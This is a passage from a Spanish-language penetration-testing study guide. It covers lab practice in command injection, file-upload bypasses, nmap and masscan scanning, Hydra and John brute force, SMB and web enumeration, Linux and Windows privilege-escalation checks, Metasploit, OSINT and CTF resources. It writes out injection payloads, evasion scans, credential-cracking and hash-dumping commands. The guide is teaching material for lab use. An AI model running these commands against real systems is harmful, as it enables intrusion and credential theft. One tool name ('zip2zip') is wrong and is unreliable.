(backtick)id(backtick)
| whoami
; ls -la
`

Practicar con:
- DVWA Command Injection
- PortSwigger OS Command Injection Labs

**File Upload Lab:**

Tecnicas de bypass:
- Cambiar extension: shell.php5, shell.phtml, shell.php.jpg
- Cambiar Content-Type: image/jpeg
- Doble extension: shell.php.jpg
- Null byte: shell.php.NUL (PHP viejo)
- Magic bytes: agregar GIF89a al inicio

Practicar con:
- DVWA File Upload
- TryHackMe: Upload Vulnerabilities

### 8.8 Escaneo de Puertos - Practica

**nmap por niveles:**

Nivel 1 - Descubrimiento de hosts:
`ash
nmap -sn 192.168.1.0/24
nmap -sn 10.10.10.0/24
`

Nivel 2 - Escaneo rapido de puertos comunes:
`ash
nmap -sS -T4 --top-ports 1000 10.10.10.10
`

Nivel 3 - Escaneo completo:
`ash
nmap -sS -p- --min-rate=5000 10.10.10.10
`

Nivel 4 - Deteccion de versiones y scripts:
`ash
nmap -sV -sC -p22,80,443 10.10.10.10
`

Nivel 5 - Escaneo sigiloso (evasion):
`ash
nmap -sS -D RND:10 --source-port 53 -f 10.10.10.10
`

**masscan (rapidisimo):**
`ash
masscan 10.10.10.0/24 -p1-65535 --rate=10000
masscan 10.10.10.10 -p80,443,22,21,3306,8080 --rate=1000
`

### 8.9 Fuerza Bruta - Practica

**Hydra - fuerza bruta online:**
`ash
# SSH
hydra -l admin -P rockyou.txt ssh://10.10.10.10

# HTTP POST form
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l ftpuser -P rockyou.txt ftp://10.10.10.10

# RDP
hydra -l administrator -P rockyou.txt rdp://10.10.10.10

# SMB
hydra -l administrator -P rockyou.txt smb://10.10.10.10
`

**John the Ripper - cracking offline:**
`ash
# Unshadow (Linux)
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=rockyou.txt

# ZIP
zip2zip encrypted.zip > hash.txt
john hash.txt --wordlist=rockyou.txt

# RAR
rar2john encrypted.rar > hash.txt
john hash.txt --wordlist=rockyou.txt
`

### 8.10 Enumeracion SMB - Practica

`ash
# Enumerar con enum4linux
enum4linux -a 10.10.10.10

# Listar shares con smbclient
smbclient -L //10.10.10.10 -N

# Conectarse a un share
smbclient //10.10.10.10/share -N

# Enumerar con smbmap
smbmap -H 10.10.10.10

# CrackMapExec (moderno)
crackmapexec smb 10.10.10.10 -u '' -p ''
crackmapexec smb 10.10.10.10 -u admin -p password123 --shares
`

### 8.11 Enumeracion Web - Practica

`ash
# Gobuster - directorios
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Gobuster - subdominios (DNS)
gobuster dns -d ejemplo.com -w /usr/share/wordlists/amass/subdomains-top1mil.txt

# WFuzz - parametros
wfuzz -c -z file,/usr/share/wordlists/common.txt --hc 404 http://10.10.10.10/FUZZ

# Nikto - scanner web
nikto -h http://10.10.10.10

# WhatWeb - identificar tecnologias
whatweb http://10.10.10.10 -v

# Curl - exploracion manual
curl -v http://10.10.10.10
curl -X POST -d "user=admin&pass=admin" http://10.10.10.10/login
curl -H "X-Forwarded-For: 127.0.0.1" http://10.10.10.10/admin
`

### 8.12 Escalada de Privilegios Linux - Checklist

**Enumeration commands:**
`ash
# Info del sistema
uname -a
cat /etc/os-release
cat /proc/version

# Usuarios
id
cat /etc/passwd
cat /etc/shadow
whoami

# SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Sudo
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Procesos
ps aux
ps -ef

# Red
netstat -tulanp
ss -tulanp

# Archivos interesantes
find / -writable -type f 2>/dev/null
find / -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "config*" -o -name "*.conf" 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# NFS
cat /etc/exports
showmount -e localhost
`

**Herramientas automaticas:**
- LinPeas: github.com/carlospolop/PEASS-ng
- LinEnum: github.com/rebootuser/LinEnum
- Linux Exploit Suggester: github.com/mzet-/linux-exploit-suggester
- GTFOBins: busca binarios SUID con funciones utiles

### 8.13 Escalada de Privilegios Windows - Checklist

**Enumeration commands:**
`powershell
# Info del sistema
systeminfo
wmic os get Caption,Version
Get-ComputerInfo

# Usuarios y grupos
whoami
whoami /all
net users
net localgroup administrators

# Parches de seguridad
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Procesos
tasklist /svc
Get-Process

# Servicios
wmic service get Name,DisplayName,PathName,StartName
Get-Service

# Archivos interesantes
findstr /si password *.txt *.ini *.config
Get-ChildItem -Recurse -Filter *.config -ErrorAction SilentlyContinue

# Network
netstat -ano
Get-NetTCPConnection
`

**Herramientas automaticas:**
- WinPeas: github.com/carlospolop/PEASS-ng
- PowerUp: github.com/PowerShellMafia/PowerSploit
- Seatbelt: github.com/GhostPack/Seatbelt
- JAWS: github.com/411Hall/JAWS
- Sherlock: github.com/rasta-mouse/Sherlock

### 8.14 Practica de OSINT

Ejercicios para practicar OSINT:

**Ejercicio 1 - Investigar una empresa:**
1. Encontrar el dominio principal
2. Buscar subdominios con crt.sh y dnsdumpster
3. Buscar empleados en LinkedIn
4. Encontrar patron de emails con hunter.io
5. Buscar filtraciones en haveibeenpwned
6. Buscar tecnologias con whatweb
7. Google dorking: site:dominio filetype:pdf

**Ejercicio 2 - Investigar una persona:**
1. Buscar en redes sociales (username igual en todas)
2. Buscar en Google Imagenes
3. Buscar en repositorios de codigo (GitHub, GitLab)
4. Buscar en foros y comunidades
5. Buscar en registros publicos
6. Buscar en Wayback Machine (archive.org) su actividad pasada
7. Buscar filtraciones de emails

**Ejercicio 3 - Investigar una IP:**
1. WHOIS de la IP
2. Shodan: shodan.io
3. Censys: censys.io
4. Reverse DNS: dig -x IP
5. Ver si la IP esta en listas negras
6. Buscar cambios historicos con securitytrails.com
### 8.15 Metasploit - Practica Basica

`ash
# Iniciar metasploit
msfconsole

# Buscar exploits
search vsftpd
search eternalblue
search type:exploit platform:windows

# Usar un exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Configurar opciones
show options
set RHOSTS 10.10.10.10
set RPORT 21
set LHOST 10.10.10.5
set LPORT 4444

# Ejecutar
run
exploit
check

# Sesiones activas
sessions
sessions -i 1

# Post-explotacion con meterpreter
sysinfo
getuid
getsystem
hashdump
screenshot
shell
upload /path/to/file
download /path/to/file
background
`

### 8.16 Burp Suite - Flujo de Trabajo

**Configuracion basica:**
1. Abrir Burp Suite (Community/Professional)
2. Ir a Proxy > Proxy Settings
3. Configurar listener en 127.0.0.1:8080
4. Configurar proxy en el navegador (FoxyProxy)
5. Instalar certificado de Burp (para HTTPS)
   - Navegar a http://burpsuite
   - Descargar e instalar el certificado CA

**Flujo tipico:**
1. Interceptar request con el Proxy
2. Enviar a Repeater (Ctrl+R) para modificar y reenviar
3. Enviar a Intruder (Ctrl+I) para automatizar ataques
4. Usar Decoder para codificar/decodificar datos
5. Revisar target map en Target > Site Map
6. Escanear automaticamente (Burp Pro)

**Intruder - Ataques:**
- Sniper: un payload, misma posicion
- Battering ram: un payload, multiples posiciones
- Pitchfork: multiples payloads, una posicion cada uno
- Cluster bomb: todas las combinaciones de multiples payloads

**Extensiones utiles:**
- Logger++: logging avanzado
- Autorize: pruebas de autorizacion
- Turbo Intruder: intruder rapido (Python)
- Collaborator Everywhere: deteccion de SSRF

### 8.17 CTF Basics

**Que es un CTF:**
Capture The Flag es una competencia de hacking donde hay que encontrar "flags" (codigos) escondidos en sistemas vulnerables.

**Tipos de CTF:**
- Jeopardy: categorias (web, crypto, forense, reversing, pwn, misc)
- Attack-Defense: atacar y defender sistemas
- Mixed: combinacion

**Categorias tipicas:**
- Web: SQLi, XSS, SSTI, LFI, SSRF, deserializacion
- Crypto: cifrados clasicos, RSA, AES, hashing, esteganografia
- Forense: analisis de archivos, memoria RAM, trafico de red
- Reversing: analisis de binarios, crackmes, keygenme
- Pwn: buffer overflow, ROP, shellcode
- Misc: OSINT, ingenio, programacion, esteganografia
- OSINT: busqueda de informacion

**Herramientas para CTF:**
- CyberChef: decodificar, transformar datos
- Burp Suite: web hacking
- Wireshark: analisis de trafico
- Ghidra/IDA: reversing
- pwntools: exploit development (Python)
- z3: constraint solver para reversing
- Steghide/stegextract: esteganografia
- John/Hashcat: cracking de hashes
- Volatility: analisis de memoria

### 8.18 Como Mantenerse Actualizado

La seguridad informatica cambia TODO EL TIEMPO. Nuevas vulnerabilidades, nuevas herramientas, nuevas tecnicas.

**Fuentes de informacion:**

**Noticias de seguridad:**
- The Hacker News (thehackernews.com)
- Bleeping Computer (bleepingcomputer.com)
- Krebs on Security (krebsonsecurity.com)
- Dark Reading (darkreading.com)
- SecurityWeek (securityweek.com)

**Vulnerabilidades:**
- CVE Mitre (cve.mitre.org)
- NVD (nvd.nist.gov)
- Exploit-DB (exploit-db.com)
- Packet Storm (packetstormsecurity.com)
- GitHub Advisory Database

**Redes Sociales:**
- Twitter/X: seguir a @MalwareTechBlog, @troyhunt, @binitamshah, @SwiftOnSecurity, @mikko
- Reddit: r/netsec, r/AskNetsec, r/blueteamsec
- LinkedIn: seguir empresas de seguridad y CISO
- YouTube: IppSec, John Hammond, LiveOverflow, 0x41414141

**Podcasts:**
- Security Now (TWIT)
- Risky Business
- Darknet Diaries (historias reales, muy recomendado)
- CyberWire Daily
- The Hacker Mind

**Conferencias (asistir o ver videos):**
- DEF CON (Las Vegas, la mas famosa)
- Black Hat (USA, Europe, Asia)
- BSides (eventos locales en todo el mundo)
- Ekoparty (Argentina, la mas importante de Latinoamerica)
- CCC (Chaos Communication Congress, Alemania)
- HITB (Hack In The Box, Asia/Europa)

### 8.19 Errores Comunes de Principiantes

**1. No enumerar lo suficiente:**
Pasan directo a explotar sin haber enumerado bien. Tiran un exploit random que no funciona y se rinden. La enumeracion es el 70% del trabajo.

**2. No entender la vulnerabilidad:**
Usan un exploit sin entender que hace. Cuando no funciona, no saben como arreglarlo. Entende la vulnerabilidad, no solo copies comandos.

**3. Saltarse pasos:**
Se saltean el escaneo completo. "Solo voy a mirar el puerto 80". Se pierden servicios en otros puertos. Escanea TODO.

**4. No tomar notas:**
No documentan lo que hacen. Despues no recuerdan que comandos usaron, que encontraron, que no funciono. Tomar notas es esencial.

**5. No entender la red del laboratorio:**
Configuran mal las redes de las VMs y no se ven entre si. O peor, ponen la VM vulnerable en modo bridge en su red de casa.

**6. Probar exploits maliciosos sin entenderlos:**
Bajan un exploit de GitHub, lo ejecutan, y termina siendo un ransomware. Siempre revisa el codigo antes de ejecutar.

**7. Depender demasiado de herramientas automaticas:**
Usan solo nmap automatico y metasploit sin entender que hacen. Las herramientas fallan, y ahi es donde importa saber lo basico.

**8. No leer la documentacion:**
No leen man pages, READMEs, ni tutorials. Despues preguntan cosas basicas que estan en la documentacion.

**9. Querer correr antes de caminar:**
Quieren hacer hacking de redes sin saber [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/IP. O reversing sin saber assembly. O explotacion sin saber C. Aprendan los fundamentos primero.

**10. No practicar consistentemente:**
Hacen una semana intensa y despues no tocan nada por meses. Mejor practicar 30 minutos todos los dias que 8 horas un solo sabado.

### 8.20 Proximos Pasos

Una vez que domines los fundamentos de este documento:

**Para especializarte en Web:**
- Profundizar en [owasp top 10](../raw/w3b-h4ck1ng.md#owasp-top-10)
- PortSwigger Web Security Academy (gratis)
- Burp Suite Certified Practitioner
- Estudiar JS, PHP, SQL, APIs REST

**Para especializarte en Redes:**
- CCNA Security o equivalente
- Protocolos: TCP/IP, DNS, DHCP, ARP, BGP, OSPF
- Herramientas: Wireshark, Scapy, Nmap avanzado
- Segmentacion, firewalls, IDS/IPS

**Para especializarte en Active Directory:**
- Estudiar como funciona AD
- Herramientas: BloodHound, Mimikatz, Impacket
- Ataques: Kerberoasting, AS-REP Roasting, DCSync
- Certificaciones: CRTP (certified offensive security)

**Para especializarte en Exploit Development:**
- Assembly (x86/x64)
- Buffer overflow, ROP, Heap exploitation
- Fuzzing
- Windows internals
- Herramientas: Ghidra, WinDbg, GDB, pwntools

**Para especializarte en Forense:**
- Analisis de memoria (Volatility)
- Analisis de disco (Sleuth Kit, Autopsy)
- Analisis de red (Wireshark, NetworkMiner)
- Recovering de archivos
- Malware analysis basico

**Para especializarte en Bug Bounty:**
- PortSwigger Web Security Academy
- Practicar en plataformas (HackerOne, Bugcrowd)
- Leer reportes publicos (Hacktivity)
- Especializarse en una categoria (XSS, SSRF, IDOR)
- Hacer programas privados primero

---

*Documento completo. Recorda: la seguridad es un viaje, no un destino. Nunca dejes de aprender.*

